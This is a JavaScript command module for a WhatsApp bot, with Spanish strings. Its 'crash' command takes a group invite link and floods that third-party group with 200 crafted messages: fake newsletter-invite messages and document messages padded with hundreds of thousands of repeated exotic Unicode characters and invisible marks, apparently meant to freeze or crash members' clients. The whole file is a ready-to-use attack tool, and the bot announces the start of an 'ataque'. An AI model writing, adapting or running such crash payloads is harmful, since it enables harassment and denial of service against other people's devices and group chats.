export default {
  name: ["crash"],
  description: "Spamea un grupo ajeno con mensajes basura (200 envíos)",
  category: 'owner',
  ownerOnly: true,

  async run({ sock, from, text, cmdName, reply }) {
    if (!text || !text.includes('whatsapp.com')) {
      return reply({ text: `😿 Debes proporcionar el enlace del grupo.\nEjemplo: .${cmdName} https://chat.whatsapp.com/XXXX` });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return reply({ text: '😡 Enlace inválido.' });

    const inviteCode = match[1];
    let groupId;

    try {
      const res = await sock.groupGetInviteInfo(inviteCode);
      groupId = res.id;
    } catch (e) {
      return reply({ text: '⚠️ No se pudo obtener el ID del grupo. Verifica que el enlace sea válido o que el grupo exista.' });
    }

    const canalKillGrupo = async () => {
      const basura = 'ꦾ'.repeat(90000);
      await sock.relayMessage(groupId, {
        newsletterAdminInviteMessage: {
          newsletterJid: '120363229729656123@newsletter',
          newsletterName: 'ADOi' + basura.repeat(3),
          jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
          caption: 'El mDKDNND',
          inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`,
        },
      }, {});
    };

    const docKillGrupo = async (i) => {
      const traba = 'ꦾ'.repeat(90000);
      const contenido = '\u200E'.repeat(5000) + i;
      await sock.sendMessage(groupId, {
        document: Buffer.from(contenido),
        fileName: `ado 🔥_${i + 1}`.repeat(2),
        mimetype: 'application/msword',
        caption: traba.repeat(3),
      });
    };

    const canalGato = async () => {
      const basura = '𑇂𑆵𑆴𑆿'.repeat(75000);
      await sock.relayMessage(groupId, {
        newsletterAdminInviteMessage: {
          newsletterJid: '120363229729656123@newsletter',
          newsletterName: '🔥👾🔥👾' + basura.repeat(3),
          jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAYEBQYFBAYGBQYHBwYIChAKCgkJChQODwwQFxQYGBcUFhYaHSUfGhsjHBYWICwgIyYnKSopGR8tMC0oMCUoKSj/2wBDAQcHBwoIChMKChMoGhYaKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAA7ADsDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAr/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AJVAAAAAAAAAAAAAAAAAAAAAA//2Q==', 'base64'),
          caption: 'El mejor bot',
          inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`,
        },
      }, {});
    };

    const docGato = async (i) => {
      const traba = '𑇂𑆵𑆴𑆿'.repeat(30000);
      const contenido = '\u200E'.repeat(5000) + i;
      await sock.sendMessage(groupId, {
        document: Buffer.from(contenido),
        fileName: `🔥 ado  🔥_${i + 1}`.repeat(2),
        mimetype: 'application/msword',
        caption: traba.repeat(3),
      });
    };

    await reply({ text: `✅ Iniciando ataque al grupo: ${groupId}` });

    const delayMs = 9000;
    const total = 200;
    const ciclos = Math.floor(total / 4);

    for (let i = 0; i < ciclos; i++) {
      await canalKillGrupo();
      await new Promise((r) => setTimeout(r, delayMs));

      await docKillGrupo(i);
      await new Promise((r) => setTimeout(r, delayMs));

      await canalGato();
      await new Promise((r) => setTimeout(r, delayMs));

      await docGato(i);
      await new Promise((r) => setTimeout(r, delayMs));
    }

    const restantes = total % 4;
    const extra = [canalKillGrupo, docKillGrupo, canalGato, docGato];
    for (let i = 0; i < restantes; i++) {
      await extra[i](i);
      await new Promise((r) => setTimeout(r, delayMs));
    }

    await reply({ text: `✅ 200 mensajes enviados al grupo ${groupId} en aproximadamente 30 minutos.` });
  },
};